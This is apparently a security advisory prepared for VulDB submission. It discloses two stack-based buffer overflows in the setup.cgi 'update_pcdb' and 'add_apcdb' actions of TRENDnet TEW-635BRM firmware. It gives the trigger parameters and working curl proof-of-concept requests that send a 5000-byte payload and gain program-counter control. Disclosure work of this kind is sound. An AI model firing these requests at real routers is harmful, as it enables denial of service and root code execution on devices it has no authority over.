# [CVE-TBD] TRENDnet TEW-635BRM 1.00.1C Stack-based Buffer Overflow (CWE-121)

## VulDB Submission Fields

- Vendor: TRENDnet
- Product: TEW-635BRM
- Version or Commit: 1.00.1C
- Vulnerability: Stack-based Buffer Overflow (CWE-121)
- Advisory / Exploit URL: replace this with the URL of this directory after copying it to your public repository
- Description:

```
A stack-based buffer overflow vulnerability was discovered in TRENDnet TEW-635BRM (hardware v1.0R) firmware V1.0(1.00.1C). The update_pcdb action of /usr/sbin/setup.cgi (0x0040ba68), when h_mac_type equals "fixed", copies the POST parameter mac_pc_dba into an 18-byte stack buffer using an unbounded strcpy(). The same root cause was previously disclosed for the sibling product TEW-657BRM as CVE-2026-5350; this submission documents the distinct affected product TEW-635BRM with the exact trigger conditions: h_ip_type=fixed, h_mac_type=fixed, h_pcdb_list=-1, c4_add_IP and add_pc_name are required business parameters (missing h_ip_type causes an earlier NULL dereference in strcmp that masks the overflow), and a valid next_file containing ".htm" is required (otherwise the closing html_parser(NULL) crashes first in strstr, likewise masking the overflow). Reproduction: curl -u admin:password -X POST http://<router>/setup.cgi with todo=update_pcdb, the business parameters above, next_file=pc_dba.htm and mac_pc_dba=5000x'E' produces SIGSEGV with epc=0x45454545, i.e. the program counter is fully controlled by the payload; the web server itself stays alive. An authenticated attacker obtains PC control of a root CGI process; on production devices (Linux 2.6, no ASLR, no stack canaries) ROP-based code execution is realistic. Proposed CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8). Confirmed on TEW-635BRM A stack-based buffer overflow vulnerability was discovered in TRENDnet TEW-635BRM (hardware v1.0R) firmware V1.0(1.00.1C). The add_apcdb action of /usr/sbin/setup.cgi (0x0040b53c), when h_mac_type equals "fixed", copies the POST parameter mac_pc_dba into an 18-byte stack buffer using an unbounded strcpy(). The same root cause was previously disclosed for the sibling product TEW-657BRM as CVE-2026-5349; this submission documents the distinct affected product TEW-635BRM with the exact trigger conditions (h_ip_type=fixed, h_mac_type=fixed, h_pcdb_list=-1, c4_add_IP, add_pc_name, and a valid .htm next_file; missing any of them causes an earlier NULL dereference that masks the overflow). Reproduction: curl -u admin:password -X POST http://<router>/setup.cgi with todo=add_apcdb, the parameters above and mac_pc_dba=5000x'E' produces SIGSEGV with epc=0x45454545, i.e. the program counter is fully controlled by the payload. An authenticated attacker obtains PC control of a root CGI process; on production devices (Linux 2.6, no ASLR, no stack canaries) ROP-based code execution is realistic. Proposed CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (8.8). Confirmed on TEW-635BRM
```

---

## Technical Disclosure

# Confirmed on TEW-635BRM: setup.cgi `update_pcdb` — `mac_pc_dba` Stack-Based Buffer Overflow (PC Control)

> Original discovery (TEW-657BRM): **CVE-2026-5350** (published
> 2026-04-02) — "The impacted element is the function update_pcdb of the
> file /setup.cgi. The manipulation of the argument mac_pc_dba results in
> stack-based buffer overflow." This document confirms the same root
> cause on TEW-635BRM v1.0R firmware V1.0(1.00.1C), with the exact
> trigger conditions and a masking effect that naive testing runs into.

## Affected Product

- Vendor: TRENDnet / Product: TEW-635BRM (v1.0R) / Firmware: V1.0(1.00.1C) (latest for v1.0R)
- Component: `/usr/sbin/setup.cgi` action `update_pcdb` (0x0040ba68)

## Root Cause

```c
// update_pcdb action (setup.cgi):
if (strcmp(find_val(req, "h_mac_type"), "fixed") == 0) {
 strcpy(&buf18, find_val(req, "mac_pc_dba")); // 18-byte stack buffer, unbounded
 ...
}
```

Trigger requirements (verified experimentally; missing any of them causes
an earlier NULL dereference that **masks** the overflow):

| Parameter | Value | Purpose |
|---|---|---|
| todo | update_pcdb | action dispatch (must be in POST body) |
| h_ip_type | fixed | otherwise early NULL deref in strcmp |
| h_mac_type | fixed | enters the strcpy branch |
| h_pcdb_list | -1 | skips the del_list path |
| c4_add_IP | 192.168.1.99 | business flow |
| add_pc_name | x | business flow |
| next_file | pc_dba.htm | otherwise the closing html_parser(NULL) crashes first (`strstr(NULL,".htm")`) |
| mac_pc_dba | 5000 × 'E' | overflow payload |

## Proof of Concept (non-destructive)

```bash
curl -s -u admin:password -X POST http://<ROUTER_IP>/setup.cgi \
 --data-urlencode "todo=update_pcdb" \
 --data-urlencode "h_ip_type=fixed" --data-urlencode "h_mac_type=fixed" \
 --data-urlencode "h_pcdb_list=-1" --data-urlencode "c4_add_IP=192.168.1.99" \
 --data-urlencode "add_pc_name=x" --data-urlencode "next_file=pc_dba.htm" \
 --data-urlencode "mac_pc_dba=$(python3 -c "print('E'*5000)")"
```

Observed on the rehosted firmware (kernel log):

```
do_page_fault(): sending SIGSEGV to setup.cgi for invalid read access from 45454544
epc = 45454545 in libc.so.0[...] # PC fully controlled by payload ("EEEE")
```

The web server itself stays alive; only the CGI child dies.

## Impact

Authenticated PC control of a root CGI process; ROP-based code execution
is realistic on production devices (Linux 2.6, no ASLR, no stack
canaries). Repeatable CGI denial of service otherwise.

## Proposed CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

## Verification

- Date: 2026-10-12 — confirmed on TEW-635BRM V1.0(1.00.1C) (rehosted firmware), `epc=0x45454545`

# Confirmed on TEW-635BRM: setup.cgi `add_apcdb` — `mac_pc_dba` Stack-Based Buffer Overflow (PC Control)

> Original discovery (TEW-657BRM): **CVE-2026-5349** (published
> 2026-04-02) — "The affected element is the function add_apcdb of the
> file /setup.cgi. The manipulation of the argument mac_pc_dba leads to
> stack-based buffer overflow." This document confirms the same root
> cause on TEW-635BRM v1.0R firmware V1.0(1.00.1C).

## Affected Product

- Vendor: TRENDnet / Product: TEW-635BRM (v1.0R) / Firmware: V1.0(1.00.1C) (latest for v1.0R)
- Component: `/usr/sbin/setup.cgi` action `add_apcdb` (0x0040b53c)

## Root Cause

```c
// add_apcdb action (setup.cgi):
if (strcmp(find_val(req, "h_mac_type"), "fixed") == 0) {
 strcpy(&buf18, find_val(req, "mac_pc_dba")); // 18-byte stack buffer, unbounded
 ...
}
```

Same trigger requirements as the `update_pcdb` confirmation (see
05-update-pcdb-mac-pc-dba-stack-overflow.md): `h_ip_type=fixed`,
`h_mac_type=fixed`, `h_pcdb_list=-1`, `c4_add_IP`, `add_pc_name`, and a
valid `next_file` are required; otherwise earlier NULL dereferences mask
the overflow.

## Proof of Concept (non-destructive)

```bash
curl -s -u admin:password -X POST http://<ROUTER_IP>/setup.cgi \
 --data-urlencode "todo=add_apcdb" \
 --data-urlencode "h_ip_type=fixed" --data-urlencode "h_mac_type=fixed" \
 --data-urlencode "h_pcdb_list=-1" --data-urlencode "c4_add_IP=192.168.1.99" \
 --data-urlencode "add_pc_name=x" --data-urlencode "next_file=pc_dba.htm" \
 --data-urlencode "mac_pc_dba=$(python3 -c "print('E'*5000)")"
```

Observed on the rehosted firmware (kernel log):

```
do_page_fault(): sending SIGSEGV to setup.cgi for invalid read access from 45454544
epc = 45454545 in libc.so.0[...] # PC fully controlled by payload ("EEEE")
```

## Impact

Authenticated PC control of a root CGI process; ROP-based code execution
realistic on production devices (no ASLR/canaries). Repeatable CGI
denial of service otherwise.

## Proposed CVSS 3.1

`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**

## Verification

- Date: 2026-10-12 — confirmed on TEW-635BRM V1.0(1.00.1C) (rehosted firmware), `epc=0x45454545`

## Proof of Concept

See the poc file(s) in this directory.
